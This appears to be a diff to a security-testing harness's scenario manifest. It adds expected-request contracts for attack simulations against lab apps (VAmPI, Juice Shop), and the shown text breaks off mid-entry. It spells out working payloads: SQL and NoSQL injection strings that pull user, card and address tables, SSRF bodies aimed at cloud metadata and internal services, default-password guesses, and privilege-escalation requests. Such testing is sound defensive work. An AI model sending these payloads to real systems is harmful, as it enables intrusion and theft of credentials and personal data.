@@ -97,7 +97,208 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "bola-admin",
+            "method": "GET",
+            "path": "/vampi/users/v1/admin",
+            "payload_class": "object-enumeration",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "bola-user1",
+            "method": "GET",
+            "path": "/vampi/users/v1/user1",
+            "payload_class": "object-enumeration",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "bola-user2",
+            "method": "GET",
+            "path": "/vampi/users/v1/user2",
+            "payload_class": "object-enumeration",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "bola-victim",
+            "method": "GET",
+            "path": "/vampi/users/v1/victim",
+            "payload_class": "object-enumeration",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "guess-password",
+            "method": "POST",
+            "path": "/vampi/users/v1/login",
+            "payload_class": "credential-guessing",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"username\":\"admin\",\"password\":\"password\"}"
+          },
+          {
+            "id": "guess-123456",
+            "method": "POST",
+            "path": "/vampi/users/v1/login",
+            "payload_class": "credential-guessing",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"username\":\"admin\",\"password\":\"123456\"}"
+          },
+          {
+            "id": "guess-admin",
+            "method": "POST",
+            "path": "/vampi/users/v1/login",
+            "payload_class": "credential-guessing",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"username\":\"admin\",\"password\":\"admin\"}"
+          },
+          {
+            "id": "guess-admin123",
+            "method": "POST",
+            "path": "/vampi/users/v1/login",
+            "payload_class": "credential-guessing",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"username\":\"admin\",\"password\":\"admin123\"}"
+          },
+          {
+            "id": "guess-letmein",
+            "method": "POST",
+            "path": "/vampi/users/v1/login",
+            "payload_class": "credential-guessing",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"username\":\"admin\",\"password\":\"letmein\"}"
+          },
+          {
+            "id": "users",
+            "method": "GET",
+            "path": "/vampi/users/v1",
+            "payload_class": "data-exposure",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "delete-admin",
+            "method": "DELETE",
+            "path": "/vampi/users/v1/admin",
+            "payload_class": "privileged-delete",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "escalate",
+            "method": "PUT",
+            "path": "/vampi/users/v1/attacker",
+            "payload_class": "privilege-assignment",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"admin\":true}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "ssrf-0",
+            "method": "POST",
+            "path": "/vampi/users/v1/_debug",
+            "payload_class": "ssrf",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"url\":\"http://169.254.169.254/latest/meta-data/\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "ssrf-1",
+            "method": "POST",
+            "path": "/vampi/users/v1/_debug",
+            "payload_class": "ssrf",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"url\":\"http://localhost:22\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "ssrf-2",
+            "method": "POST",
+            "path": "/vampi/users/v1/_debug",
+            "payload_class": "ssrf",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"url\":\"http://127.0.0.1:6379\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "ssrf-3",
+            "method": "POST",
+            "path": "/vampi/users/v1/_debug",
+            "payload_class": "ssrf",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"url\":\"http://internal.service.local/admin\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "debug-0",
+            "method": "GET",
+            "path": "/vampi/_debug",
+            "payload_class": "debug-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "debug-1",
+            "method": "GET",
+            "path": "/vampi/console",
+            "payload_class": "debug-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "debug-2",
+            "method": "GET",
+            "path": "/vampi/swagger.json",
+            "payload_class": "debug-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "debug-3",
+            "method": "GET",
+            "path": "/vampi/openapi.json",
+            "payload_class": "debug-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "debug-4",
+            "method": "GET",
+            "path": "/vampi/v1/docs",
+            "payload_class": "debug-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "debug-5",
+            "method": "GET",
+            "path": "/vampi/admin",
+            "payload_class": "debug-discovery",
+            "minimum_dispatches": 1
+          }
+        ]
+      }
     },
     {
       "id": "api-attacks/02-sqlmap-api",
@@ -2090,7 +2291,51 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "login-17",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "sql-login-bypass",
+            "minimum_dispatches": 2,
+            "body_exact": "{\"email\":\"admin'--\",\"password\":\"x\"}"
+          },
+          {
+            "id": "login-18",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "sql-login-bypass",
+            "minimum_dispatches": 2,
+            "body_exact": "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}"
+          },
+          {
+            "id": "login-19",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "sql-login-bypass",
+            "minimum_dispatches": 2,
+            "body_exact": "{\"email\":\"admin'/*\",\"password\":\"x\"}"
+          },
+          {
+            "id": "login-20",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "sql-login-bypass",
+            "minimum_dispatches": 2,
+            "body_exact": "{\"email\":\"bender@juice-sh.op'--\",\"password\":\"x\"}"
+          },
+          {
+            "id": "login-21",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "sql-login-bypass",
+            "minimum_dispatches": 2,
+            "body_exact": "{\"email\":\"jim@juice-sh.op'--\",\"password\":\"x\"}"
+          }
+        ]
+      }
     },
     {
       "id": "juice-shop-exploits/02-sqli-search-union",
@@ -2103,7 +2348,201 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "columns-1",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-column-enumeration",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))UNION SELECT '1'--"
+            }
+          },
+          {
+            "id": "columns-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-column-enumeration",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))UNION SELECT '1','2'--"
+            }
+          },
+          {
+            "id": "columns-3",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-column-enumeration",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))UNION SELECT '1','2','3'--"
+            }
+          },
+          {
+            "id": "columns-4",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-column-enumeration",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))UNION SELECT '1','2','3','4'--"
+            }
+          },
+          {
+            "id": "columns-5",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-column-enumeration",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))UNION SELECT '1','2','3','4','5'--"
+            }
+          },
+          {
+            "id": "columns-6",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-column-enumeration",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))UNION SELECT '1','2','3','4','5','6'--"
+            }
+          },
+          {
+            "id": "columns-7",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-column-enumeration",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))UNION SELECT '1','2','3','4','5','6','7'--"
+            }
+          },
+          {
+            "id": "columns-8",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-column-enumeration",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))UNION SELECT '1','2','3','4','5','6','7','8'--"
+            }
+          },
+          {
+            "id": "columns-9",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-column-enumeration",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))UNION SELECT '1','2','3','4','5','6','7','8','9'--"
+            }
+          },
+          {
+            "id": "extract-users-table",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--"
+            }
+          },
+          {
+            "id": "extract-sqlite-master",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))UNION SELECT sql,'2','3','4','5','6','7','8','9' FROM sqlite_master--"
+            }
+          },
+          {
+            "id": "extract-user-creds",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))UNION SELECT id,username,email,password,'5','6','7','8','9' FROM Users--"
+            }
+          },
+          {
+            "id": "extract-cards",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))UNION SELECT id,fullName,cardNum,expMonth,'5','6','7','8','9' FROM Cards--"
+            }
+          },
+          {
+            "id": "extract-addresses",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))UNION SELECT id,fullName,street,city,'5','6','7','8','9' FROM Addresses--"
+            }
+          },
+          {
+            "id": "parenthesis-variation",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))UNION ALL SELECT '1','2','3','4','5','6','7','8','9'--"
+            }
+          },
+          {
+            "id": "double-pipe-concat",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))||1=1--"
+            }
+          },
+          {
+            "id": "sleep-based-blind",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))AND 1=1 AND ((1=1"
+            }
+          },
+          {
+            "id": "order-by-probe",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))ORDER BY 9--"
+            }
+          },
+          {
+            "id": "order-by-overflow",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-union-query",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test'))ORDER BY 10--"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "juice-shop-exploits/03-xss-dom-reflected",
@@ -2168,7 +2607,119 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "discovery-0",
+            "method": "GET",
+            "path": "/juice-shop/metrics",
+            "payload_class": "sensitive-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-1",
+            "method": "GET",
+            "path": "/juice-shop/api/Challenges",
+            "payload_class": "sensitive-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-2",
+            "method": "GET",
+            "path": "/juice-shop/api/Users",
+            "payload_class": "sensitive-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-3",
+            "method": "GET",
+            "path": "/juice-shop/api/SecurityQuestions",
+            "payload_class": "sensitive-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-4",
+            "method": "GET",
+            "path": "/juice-shop/api/Products",
+            "payload_class": "sensitive-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-5",
+            "method": "GET",
+            "path": "/juice-shop/ftp/",
+            "payload_class": "sensitive-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-6",
+            "method": "GET",
+            "path": "/juice-shop/encryptionkeys/",
+            "payload_class": "sensitive-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-7",
+            "method": "GET",
+            "path": "/juice-shop/robots.txt",
+            "payload_class": "sensitive-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-8",
+            "method": "GET",
+            "path": "/juice-shop/.well-known/security.txt",
+            "payload_class": "sensitive-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-9",
+            "method": "GET",
+            "path": "/juice-shop/main.js",
+            "payload_class": "sensitive-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-10",
+            "method": "GET",
+            "path": "/juice-shop/main.js.map",
+            "payload_class": "sensitive-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-11",
+            "method": "GET",
+            "path": "/juice-shop/api/nonexistent",
+            "payload_class": "sensitive-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-12",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sensitive-file-discovery",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "''"
+            }
+          },
+          {
+            "id": "discovery-13",
+            "method": "GET",
+            "path": "/juice-shop/api-docs/",
+            "payload_class": "sensitive-file-discovery",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "discovery-14",
+            "method": "GET",
+            "path": "/juice-shop/api-docs/swagger.json",
+            "payload_class": "sensitive-file-discovery",
+            "minimum_dispatches": 1
+          }
+        ]
+      }
     },
     {
       "id": "juice-shop-exploits/08-nosql-injection",
@@ -2181,7 +2732,230 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "patch-0",
+            "method": "PATCH",
+            "path": "/juice-shop/rest/products/reviews",
+            "payload_class": "nosql-operator",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"id\":{\"$ne\":-1},\"message\":\"NoSQL injected review\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "patch-1",
+            "method": "PATCH",
+            "path": "/juice-shop/rest/products/reviews",
+            "payload_class": "nosql-operator",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"id\":{\"$gt\":0},\"message\":\"mass update via $gt\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "patch-2",
+            "method": "PATCH",
+            "path": "/juice-shop/rest/products/reviews",
+            "payload_class": "nosql-operator",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"id\":{\"$regex\":\".*\"},\"message\":\"regex injection\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "patch-3",
+            "method": "PATCH",
+            "path": "/juice-shop/rest/products/reviews",
+            "payload_class": "nosql-operator",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"id\":{\"$exists\":true},\"message\":\"exists injection\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "patch-4",
+            "method": "PATCH",
+            "path": "/juice-shop/rest/products/reviews",
+            "payload_class": "nosql-operator",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"id\":{\"$where\":\"1==1\"},\"message\":\"where injection\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "patch-5",
+            "method": "PATCH",
+            "path": "/juice-shop/rest/products/reviews",
+            "payload_class": "nosql-operator",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"id\":{\"$nin\":[]},\"message\":\"nin empty array\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "patch-6",
+            "method": "PATCH",
+            "path": "/juice-shop/rest/products/reviews",
+            "payload_class": "nosql-operator",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"id\":{\"$or\":[{\"$gt\":0},{\"$lt\":999}]},\"message\":\"or operator\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "review-1-0",
+            "method": "PUT",
+            "path": "/juice-shop/rest/products/1/reviews",
+            "payload_class": "nosql-operator",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"message\":\"test\",\"author\":{\"$gt\":\"\"}}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "review-1-1",
+            "method": "PUT",
+            "path": "/juice-shop/rest/products/1/reviews",
+            "payload_class": "nosql-operator",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"message\":{\"$ne\":\"\"},\"author\":\"test@test.com\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "review-1-2",
+            "method": "PUT",
+            "path": "/juice-shop/rest/products/1/reviews",
+            "payload_class": "nosql-operator",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"message\":\"test\",\"author\":\"test@test.com\",\"$where\":\"1==1\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "review-2-0",
+            "method": "PUT",
+            "path": "/juice-shop/rest/products/2/reviews",
+            "payload_class": "nosql-operator",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"message\":\"test\",\"author\":{\"$gt\":\"\"}}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "review-2-1",
+            "method": "PUT",
+            "path": "/juice-shop/rest/products/2/reviews",
+            "payload_class": "nosql-operator",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"message\":{\"$ne\":\"\"},\"author\":\"test@test.com\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "review-2-2",
+            "method": "PUT",
+            "path": "/juice-shop/rest/products/2/reviews",
+            "payload_class": "nosql-operator",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"message\":\"test\",\"author\":\"test@test.com\",\"$where\":\"1==1\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "review-3-0",
+            "method": "PUT",
+            "path": "/juice-shop/rest/products/3/reviews",
+            "payload_class": "nosql-operator",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"message\":\"test\",\"author\":{\"$gt\":\"\"}}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "review-3-1",
+            "method": "PUT",
+            "path": "/juice-shop/rest/products/3/reviews",
+            "payload_class": "nosql-operator",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"message\":{\"$ne\":\"\"},\"author\":\"test@test.com\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "review-3-2",
+            "method": "PUT",
+            "path": "/juice-shop/rest/products/3/reviews",
+            "payload_class": "nosql-operator",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"message\":\"test\",\"author\":\"test@test.com\",\"$where\":\"1==1\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          },
+          {
+            "id": "login-0",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "nosql-login",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}"
+          },
+          {
+            "id": "login-1",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "nosql-login",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":{\"$ne\":\"nonexistent@x.com\"},\"password\":{\"$ne\":\"wrongpassword\"}}"
+          },
+          {
+            "id": "login-2",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "nosql-login",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":{\"$regex\":\"admin.*\"},\"password\":{\"$gt\":\"\"}}"
+          },
+          {
+            "id": "login-3",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "nosql-login",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"admin@juice-sh.op\",\"password\":{\"$ne\":\"\"}}"
+          },
+          {
+            "id": "timing",
+            "method": "PATCH",
+            "path": "/juice-shop/rest/products/reviews",
+            "payload_class": "nosql-delay",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"id\":{\"$where\":\"sleep(2000)\"},\"message\":\"timing test\"}",
+            "header_regex": {
+              "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "juice-shop-exploits/09-file-upload-xxe",
@@ -2908,7 +3682,32 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "denied",
+            "method": "GET",
+            "path": "/spol-denied",
+            "payload_class": "configured-service-policy",
+            "minimum_dispatches": 5,
+            "headers": {
+              "user-agent": "spol5-verify",
+              "x-spol5-verify": "deny"
+            }
+          },
+          {
+            "id": "control",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "allowed-control",
+            "minimum_dispatches": 1,
+            "headers": {
+              "user-agent": "spol5-verify"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "ssl-scanning/01-sslscan",
@@ -2986,7 +3785,1428 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "GET-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "POST-1",
+            "method": "POST",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PUT-2",
+            "method": "PUT",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DELETE-3",
+            "method": "DELETE",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PATCH-4",
+            "method": "PATCH",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "OPTIONS-5",
+            "method": "OPTIONS",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "HEAD-6",
+            "method": "HEAD",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "TRACE-7",
+            "method": "TRACE",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "CONNECT-8",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "headers": {
+              "x-tgen-raw-method": "CONNECT"
+            }
+          },
+          {
+            "id": "PROPFIND-9",
+            "method": "PROPFIND",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PROPPATCH-10",
+            "method": "PROPPATCH",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MKCOL-11",
+            "method": "MKCOL",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "COPY-12",
+            "method": "COPY",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MOVE-13",
+            "method": "MOVE",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "LOCK-14",
+            "method": "LOCK",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "UNLOCK-15",
+            "method": "UNLOCK",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "SEARCH-16",
+            "method": "SEARCH",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PURGE-17",
+            "method": "PURGE",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DEBUG-18",
+            "method": "DEBUG",
+            "path": "/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "GET-19",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "POST-20",
+            "method": "POST",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PUT-21",
+            "method": "PUT",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DELETE-22",
+            "method": "DELETE",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PATCH-23",
+            "method": "PATCH",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "OPTIONS-24",
+            "method": "OPTIONS",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "HEAD-25",
+            "method": "HEAD",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
